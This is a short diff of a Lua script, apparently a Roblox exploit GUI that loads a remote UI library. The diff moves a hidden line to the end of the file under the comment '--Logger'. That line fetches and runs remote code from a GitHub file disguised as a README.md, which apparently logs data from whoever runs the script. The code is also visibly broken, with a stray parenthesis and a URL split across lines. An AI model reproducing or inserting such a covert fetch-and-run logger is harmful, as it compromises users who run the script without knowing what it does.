@@ -1,7 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Marwanleprodu91670/lib/refs/heads/main/README.md
-"))()
-
-
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()
 
 
@@ -791,3 +787,7 @@ Credittab:AddLabel("Discord Server: https://discord.gg/ZgDYgKa2")
 
 -- Show the window
 window:Show())
+
+--Logger
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Marwanleprodu91670/lib/refs/heads/main/README.md
+"))()
